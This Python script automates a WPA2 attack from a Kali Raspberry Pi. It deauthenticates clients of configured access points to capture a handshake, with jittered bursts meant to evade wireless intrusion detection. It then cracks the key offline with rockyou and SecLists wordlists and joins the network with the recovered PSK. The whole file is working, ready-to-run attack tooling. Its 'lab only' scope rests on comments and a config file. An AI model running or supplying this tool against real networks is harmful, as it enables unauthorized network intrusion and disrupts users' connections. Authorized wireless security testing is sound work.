#!/usr/bin/env python3
"""
wpacrack - autonomous WPA2 handshake capture + crack for the lab AP, self-contained on Pie-Kali.
Pattern mirrors ngbf/upnpwatch: runs as a systemd service, beacons STATUS.txt/RESULT.txt,
survives SSH disconnect, and restores the box to a clean managed state on stop/finish.

Flow: monitor-mode wlan1 -> capture a 4-way handshake (deauth lab clients, rotate the 2.4/5GHz
      BSSIDs) -> crack with escalating wordlists -> on success set the NM PSK and reconnect
      wlan1 to the lab LAN so we can pick straight back up.

Scope: only ever touches the single lab AP defined in TARGETS below. Read-only w.r.t. every
       other network (it only deauths clients of that one BSSID).

No-lockout by design: the PSK is recovered by capturing ONE handshake and cracking it
OFFLINE - the Pi never repeatedly guesses the PSK against the live AP, so it cannot trip a
failed-auth / MAC lockout. Deauth is deliberately gentle (small, jittered bursts, a hard total
cap) to avoid any WIDS reaction, and the only association the tool ever makes is a single clean
join with the already-correct cracked key. Join retries (if the flaky Realtek link needs them)
are spaced with backoff - never a rapid wrong-credential hammer.
"""
import os, sys, time, subprocess, signal, re, glob, shlex, traceback, datetime, random

# ---------------- CONFIG ----------------
# Site-specific values (SSID, BSSIDs, PSK-guess seeds) are NOT hardcoded here - they are loaded
# from wpacrack.conf (see wpacrack.conf.example). The conf file is gitignored so a lab's real AP
# identifiers never land in the repo, and the tool refuses to run without it (so it can never
# accidentally deauth a placeholder/other BSSID). These are inert defaults, overwritten at load.
IFACE       = "wlan1"
ESSID       = ""               # from conf: essid
NM_PROFILE  = ""               # from conf: nm_profile
TARGETS     = []               # from conf: targets = BSSID:CHANNEL,BSSID:CHANNEL
LAB_NET     = "192.168.0."     # from conf: lab_net
LAB_GW      = "192.168.0.1"    # from conf: lab_gw
CUSTOM_SEEDS = []              # from conf: custom_seeds = word1,word2  (offline PSK-guess bases)
CONNECT_ON_SUCCESS = True

CAPTURE_BUDGET = 2400   # max seconds to hunt a handshake (then give up cleanly)
DWELL          = 75     # seconds to sit on each target per cycle
# --- gentle, lockout-safe deauth tuning ---
DEAUTH_EVERY     = 18   # base seconds between deauth bursts (jittered +/-)
DEAUTH_JITTER    = 8    # random +/- seconds added to each interval (avoid a periodic WIDS signature)
DEAUTH_COUNT     = 3    # frames per targeted burst (small: nudge a client to re-handshake, not flood)
DEAUTH_TOTAL_CAP = 120  # HARD global ceiling on deauth frames for the whole run; stop deauthing past it
PASSIVE_FIRST    = 20   # seconds to listen passively before ANY deauth (a natural join may hand us the HS free)

WORK   = "/opt/wpacrack"
CAPS   = WORK + "/caps"
STATUS = WORK + "/STATUS.txt"
RESULT = WORK + "/RESULT.txt"
LOG    = WORK + "/wpacrack.log"
CUSTOM = WORK + "/custom.txt"
GOOD   = WORK + "/handshake.cap"
HOMES  = ["/root", "/home/kali", "/home/kali-pie"]

WORDLISTS = [
    CUSTOM,
    "/usr/share/wordlists/rockyou.txt.gz",
    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
    "/usr/share/seclists/Passwords/darkweb2017-top10000.txt",
    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt",
]
# ----------------------------------------

children = []
_state = {"phase": "init", "detail": "", "started": time.time()}
_cleaned = False
_deauth_sent = 0   # running total of deauth frames, enforced against DEAUTH_TOTAL_CAP


CONF_PATHS = [os.path.join(os.path.dirname(os.path.abspath(__file__)), "wpacrack.conf"),
              "/opt/wpacrack/wpacrack.conf"]


def load_config():
    """Load site config from wpacrack.conf (key = value). Refuses to run without a valid
    targets list, so the tool can never deauth a placeholder/other BSSID by accident."""
    global IFACE, ESSID, NM_PROFILE, TARGETS, LAB_NET, LAB_GW, CUSTOM_SEEDS
    path = next((p for p in CONF_PATHS if os.path.exists(p)), None)
    if not path:
        sys.stderr.write("FATAL: no wpacrack.conf found (copy wpacrack.conf.example and edit).\n")
        sys.exit(2)
    cfg = {}
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            cfg[k.strip().lower()] = v.strip()
    IFACE      = cfg.get("iface", IFACE)
    ESSID      = cfg.get("essid", "")
    NM_PROFILE = cfg.get("nm_profile", ESSID)
    LAB_NET    = cfg.get("lab_net", LAB_NET)
    LAB_GW     = cfg.get("lab_gw", LAB_GW)
    tgs = []
    for tok in cfg.get("targets", "").split(","):
        tok = tok.strip()
        if ":" in tok and "-" not in tok:
            bssid, _, ch = tok.rpartition(":")
            bssid = bssid.strip()
            if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid) and ch.strip().isdigit():
                tgs.append((bssid.upper(), int(ch)))
    TARGETS = tgs
    CUSTOM_SEEDS = [w.strip() for w in cfg.get("custom_seeds", "").split(",") if w.strip()]
    if not TARGETS:
        sys.stderr.write("FATAL: wpacrack.conf has no valid 'targets = BSSID:CH,...' - refusing to run.\n")
        sys.exit(2)


def now():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(msg):
    try:
        with open(LOG, "a") as f:
            f.write(f"[{now()}] {msg}\n")
    except Exception:
        pass


def write_status():
    el = int(time.time() - _state["started"])
    block = (f"wpacrack STATUS @ {now()}\n"
             f"  phase   : {_state['phase']}\n"
             f"  detail  : {_state['detail']}\n"
             f"  elapsed : {el // 60}m{el % 60}s\n"
             f"  iface   : {IFACE}   essid: {ESSID}\n")
    try:
        with open(STATUS, "w") as f:
            f.write(block)
    except Exception:
        pass


def set_state(phase=None, detail=None):
    if phase is not None:
        _state["phase"] = phase
    if detail is not None:
        _state["detail"] = detail
    write_status()
    log(f"{_state['phase']}: {_state['detail']}")


def run(cmd, timeout=60, shell=False):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=shell)
    except subprocess.TimeoutExpired as e:
        return e
    except Exception as e:
        log(f"run error {cmd}: {e}")
        return None


def write_result(msg, extra=""):
    body = f"wpacrack RESULT @ {now()}\n{msg}\n{extra}\n"
    try:
        with open(RESULT, "w") as f:
            f.write(body)
    except Exception:
        pass
    for h in HOMES:
        try:
            with open(os.path.join(h, "wpacrack_RESULT.txt"), "w") as f:
                f.write(body)
        except Exception:
            pass
    log("RESULT: " + msg)


# ---------------- interface / NetworkManager ----------------
def netwatch(state):
    run(["/usr/local/bin/netwatch-ctl", state])


def stop_nm():
    run(["systemctl", "stop", "NetworkManager"])
    run(["pkill", "-x", "wpa_supplicant"])
    time.sleep(1)


def start_nm():
    run(["systemctl", "start", "NetworkManager"])
    time.sleep(4)


def set_monitor():
    run(["ip", "link", "set", IFACE, "down"])
    run(["iw", "dev", IFACE, "set", "type", "monitor"])
    run(["ip", "link", "set", IFACE, "up"])


def set_managed():
    run(["ip", "link", "set", IFACE, "down"])
    run(["iw", "dev", IFACE, "set", "type", "managed"])
    run(["ip", "link", "set", IFACE, "up"])


def set_channel(ch):
    run(["iw", "dev", IFACE, "set", "channel", str(ch)])


def kill_children():
    for p in children[:]:
        try:
            p.terminate()
        except Exception:
            pass
    time.sleep(1)
    for p in children[:]:
        try:
            if p.poll() is None:
                p.kill()
        except Exception:
            pass
    children.clear()


# ---------------- capture ----------------
def parse_stations(csv_path, bssid):
    stas = set()
    try:
        with open(csv_path, errors="ignore") as f:
            txt = f.read()
    except Exception:
        return stas
    if "Station MAC" not in txt:
        return stas
    seg = txt.split("Station MAC", 1)[1]
    for line in seg.splitlines()[1:]:
        parts = [x.strip() for x in line.split(",")]
        if len(parts) < 6:
            continue
        mac, assoc = parts[0], parts[5]
        if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac) and assoc.lower() == bssid.lower():
            stas.add(mac)
    return stas


def eapol_ok(cap, bssid):
    """True when the pcap holds EAPOL frames both to and from the AP for a common station
    (i.e. a usable 4-way handshake)."""
    r = run(["tshark", "-r", cap, "-n", "-Y", "eapol", "-T", "fields",
             "-e", "wlan.sa", "-e", "wlan.da"], timeout=90)
    if not r or not getattr(r, "stdout", ""):
        return False
    b = bssid.lower()
    frm, to = set(), set()
    for line in r.stdout.splitlines():
        p = line.split("\t")
        if len(p) < 2:
            continue
        sa, da = p[0].lower(), p[1].lower()
        if sa == b:
            frm.add(da)
        if da == b:
            to.add(sa)
    return len(frm & to) > 0


def start_airodump(bssid, ch, prefix):
    for f in glob.glob(prefix + "*"):
        try:
            os.remove(f)
        except Exception:
            pass
    p = subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "-c", str(ch), "-w", prefix,
         "--output-format", "pcap,csv", IFACE],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    children.append(p)
    return p


def deauth(bssid, stas):
    """Gentle, capped, targeted deauth. Prefers per-client bursts (nudges just that station to
    re-handshake) over broadcast (which disrupts every client and looks like a flood to a WIDS).
    Never exceeds DEAUTH_TOTAL_CAP frames across the whole run."""
    global _deauth_sent
    if _deauth_sent >= DEAUTH_TOTAL_CAP:
        set_state(detail=_state["detail"] + " [deauth cap reached - passive only]")
        return
    if stas:
        # targeted: one small burst to a single client per call (round-robin handled by caller set)
        for s in list(stas)[:2]:
            if _deauth_sent >= DEAUTH_TOTAL_CAP:
                break
            run(["aireplay-ng", "--deauth", str(DEAUTH_COUNT), "-a", bssid, "-c", s, IFACE], timeout=20)
            _deauth_sent += DEAUTH_COUNT
    else:
        # no client visible: a single tiny broadcast nudge (1 frame) to surface/rejoin a sleeping client
        if _deauth_sent < DEAUTH_TOTAL_CAP:
            run(["aireplay-ng", "--deauth", "1", "-a", bssid, IFACE], timeout=20)
            _deauth_sent += 1


def capture():
    t0 = time.time()
    cyc = 0
    while time.time() - t0 < CAPTURE_BUDGET:
        cyc += 1
        for bssid, ch in TARGETS:
            if time.time() - t0 >= CAPTURE_BUDGET:
                break
            prefix = f"{CAPS}/hs_{bssid.replace(':', '')}"
            set_channel(ch)
            start_airodump(bssid, ch, prefix)
            set_state("capture", f"cycle {cyc} {bssid} ch{ch} - passive listen {PASSIVE_FIRST}s")
            # passive-first: a naturally (re)joining client may hand us the handshake with zero deauth
            pt = time.time()
            while time.time() - pt < PASSIVE_FIRST:
                time.sleep(4)
                for c in glob.glob(prefix + "*.cap"):
                    if eapol_ok(c, bssid):
                        run(["cp", c, GOOD]); kill_children()
                        set_state("captured", f"handshake for {bssid} (passive) -> {GOOD}")
                        return bssid
            dwell0 = time.time()
            while time.time() - dwell0 < DWELL:
                time.sleep(max(4, DEAUTH_EVERY + random.randint(-DEAUTH_JITTER, DEAUTH_JITTER)))
                stas = parse_stations(prefix + "-01.csv", bssid)
                capped = " [cap]" if _deauth_sent >= DEAUTH_TOTAL_CAP else ""
                set_state("capture",
                          f"cycle {cyc} {bssid} ch{ch} - {len(stas)} client(s), deauth={_deauth_sent}/{DEAUTH_TOTAL_CAP}{capped}")
                deauth(bssid, stas)
                for c in glob.glob(prefix + "*.cap"):
                    if eapol_ok(c, bssid):
                        run(["cp", c, GOOD])
                        kill_children()
                        set_state("captured", f"handshake for {bssid} -> {GOOD}")
                        return bssid
            kill_children()
    return None


# ---------------- crack ----------------
def gen_custom():
    """Build a small high-probability candidate list from the operator-supplied CUSTOM_SEEDS
    (case variants + common numeric/symbol suffixes) plus a handful of generic weak defaults.
    Seeds come from wpacrack.conf, never hardcoded, so no site password hints live in the repo."""
    words = set()
    tails = [""] + [str(n) for n in range(0, 100)] + [str(y) for y in range(2015, 2028)] + \
            ["!", "1", "12", "123", "1234", "!23", "20", "21", "22", "23", "24", "25",
             "00", "000", "123!"]
    for seed in CUSTOM_SEEDS:
        for b in {seed, seed.lower(), seed.upper(), seed.capitalize()}:
            for t in tails:
                words.add(b + t)
    for w in ["password", "Password1", "12345678", "123456789", "admin123", "letmein",
              "changeme", "qwerty123", "iloveyou"]:
        words.add(w)
    try:
        with open(CUSTOM, "w") as f:
            f.write("\n".join(sorted(words)) + "\n")
    except Exception:
        pass


def crack(bssid):
    for wl in WORDLISTS:
        if not os.path.exists(wl):
            continue
        set_state("crack", f"trying wordlist {os.path.basename(wl)}")
        if wl.endswith(".gz"):
            cmd = f"zcat {shlex.quote(wl)} | aircrack-ng -a2 -b {bssid} -w - {shlex.quote(GOOD)}"
            r = run(cmd, timeout=7200, shell=True)
        else:
            r = run(["aircrack-ng", "-a2", "-b", bssid, "-w", wl, GOOD], timeout=7200)
        out = getattr(r, "stdout", "") or ""
        m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", out)
        if m:
            set_state("crack", f"KEY FOUND via {os.path.basename(wl)}")
            return m.group(1)
    return None


# ---------------- connect ----------------
def connect(psk):
    set_state("connect", "restoring managed mode + NetworkManager")
    set_managed()
    start_nm()
    run(["nmcli", "connection", "modify", NM_PROFILE,
         "802-11-wireless-security.psk", psk,
         "802-11-wireless-security.psk-flags", "0"])
    ip = None
    for attempt in range(6):
        run(["nmcli", "connection", "up", NM_PROFILE, "ifname", IFACE], timeout=45)
        time.sleep(4)
        r = run(["ip", "-4", "addr", "show", IFACE])
        out = getattr(r, "stdout", "") or ""
        m = re.search(r"inet (" + re.escape(LAB_NET) + r"\d+)", out)
        if m:
            ip = m.group(1)
            break
        # backoff between join attempts (key is correct; this only rides out link flaps)
        backoff = 6 + attempt * 6
        set_state("connect", f"attempt {attempt + 1}: no lab IP yet, backing off {backoff}s")
        time.sleep(backoff)
    if ip:
        netwatch("on")
        set_state("connected", f"wlan1 = {ip} on lab LAN")
    return ip


# ---------------- cleanup / signals ----------------
def cleanup(reconnect_ok=False):
    global _cleaned
    if _cleaned:
        return
    _cleaned = True
    kill_children()
    if not reconnect_ok:
        try:
            set_managed()
            start_nm()
        except Exception:
            pass


def on_term(signum, frame):
    log(f"signal {signum} - stopping")
    set_state("stopping", "received stop signal")
    cleanup(reconnect_ok=False)
    write_result("STOPPED by signal before completion",
                 "box restored to managed mode; rerun wpacrack-start to resume.")
    os._exit(0)


# ---------------- main ----------------
def main():
    load_config()
    os.makedirs(CAPS, exist_ok=True)
    signal.signal(signal.SIGTERM, on_term)
    signal.signal(signal.SIGINT, on_term)
    _state["started"] = time.time()
    try:
        open(RESULT, "w").close()
    except Exception:
        pass
    set_state("init", "preflight + monitor mode")
    gen_custom()
    netwatch("off")
    stop_nm()
    set_monitor()
    set_channel(TARGETS[0][1])
    try:
        bssid = capture()
        if not bssid:
            write_result("NO HANDSHAKE captured within budget",
                         "Retry when a lab client (extender .20 / Fire TV .18 / IoT .27) is powered & associated.")
            cleanup(reconnect_ok=False)
            set_state("done", "no handshake")
            return
        if not CONNECT_ON_SUCCESS:
            key = crack(bssid)
            write_result(f"KEY: {key}" if key else "handshake captured; key not in wordlists",
                         f"handshake pcap: {GOOD}")
            cleanup(reconnect_ok=False)
            return
        key = crack(bssid)
        if not key:
            write_result("HANDSHAKE CAPTURED but key NOT found in wordlists",
                         f"pcap saved at {GOOD} for offline cracking (e.g. hashcat -m 22000).")
            cleanup(reconnect_ok=False)
            set_state("done", "handshake captured, key not found")
            return
        ip = connect(key)
        if ip:
            write_result("SUCCESS - PSK recovered and wlan1 connected to lab LAN",
                         f"PSK: {key}\nwlan1 IP: {ip}\n"
                         f"Next: read lab WAN IP via UPnP GetExternalIPAddress on {LAB_GW}.")
            set_state("done", f"connected {ip}")
        else:
            write_result(f"PSK recovered ({key}) but wlan1 did NOT get a lab IP",
                         "Realtek link may be flapping; rerun connect or check the adapter.")
            cleanup(reconnect_ok=True)
            set_state("done", "psk found, not connected")
    except Exception:
        tb = traceback.format_exc()
        log("FATAL:\n" + tb)
        write_result("ERROR - see wpacrack.log", tb[-800:])
        cleanup(reconnect_ok=False)


if __name__ == "__main__":
    main()
